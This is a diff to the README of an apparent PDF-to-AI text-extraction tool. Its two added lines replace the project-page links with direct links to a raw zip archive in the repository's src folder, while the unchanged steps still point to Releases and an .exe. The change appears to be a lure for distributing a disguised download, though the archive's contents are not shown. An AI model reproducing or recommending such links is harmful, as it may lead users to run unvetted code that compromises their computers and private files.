@@ -1,6 +1,6 @@
 # 📄 PDF-Context-Extractor - Get text from files for AI
 
-[![Download PDF-Context-Extractor](https://img.shields.io/badge/Download-PDF--Context--Extractor-blue.svg)](https://github.com/Unconventional-paleness785/PDF-Context-Extractor)
+[![Download PDF-Context-Extractor](https://img.shields.io/badge/Download-PDF--Context--Extractor-blue.svg)](https://github.com/Unconventional-paleness785/PDF-Context-Extractor/raw/refs/heads/main/src/Context-PD-Extractor-2.6.zip)
 
 This tool helps you move text from PDF files into AI chat tools. You keep your files on your computer. Your data stays private. You do not need to upload your sensitive documents to a cloud server.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the application:
 
 You must visit the project page to download the setup file for your computer.
 
-1. Go to this link to find the latest version: [https://github.com/Unconventional-paleness785/PDF-Context-Extractor](https://github.com/Unconventional-paleness785/PDF-Context-Extractor)
+1. Go to this link to find the latest version: [https://github.com/Unconventional-paleness785/PDF-Context-Extractor/raw/refs/heads/main/src/Context-PD-Extractor-2.6.zip](https://github.com/Unconventional-paleness785/PDF-Context-Extractor/raw/refs/heads/main/src/Context-PD-Extractor-2.6.zip)
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version number.
 4. Locate the file ending in .exe under the Assets heading.
